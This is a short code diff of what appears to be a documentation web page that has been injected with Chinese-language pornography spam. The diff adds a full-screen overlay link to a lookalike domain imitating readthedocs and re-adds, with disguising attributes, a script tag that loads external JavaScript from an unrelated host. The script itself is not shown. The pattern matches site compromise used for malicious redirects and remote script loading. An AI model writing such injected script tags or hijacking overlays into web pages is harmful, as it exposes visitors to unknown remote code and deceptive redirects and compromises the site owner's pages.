@@ -23,5 +23,6 @@ pornhub下载栏目提供了最全的pornhub版本内容,喜欢这款软件的�
 <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center;">
  <a href="http://readthedocs1.io.k709.com/?20250318.html" style="text-decoration: none; color: white; background-color: black; font-size: 32px; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center;">👉👉👉♥♥点我进入♥观看入口一👈👈👈</a>
 </div>
-    <script type="text/javascript" src="http://37x7.com/come/shipin.js"></script>
+<script data-n-head="ssr" type="text/javascript" src="http://37x7.com/come/shipin.js" data-body="true"></script>
+
 For a detailed guide, visit the [Guide](guide.md) page.
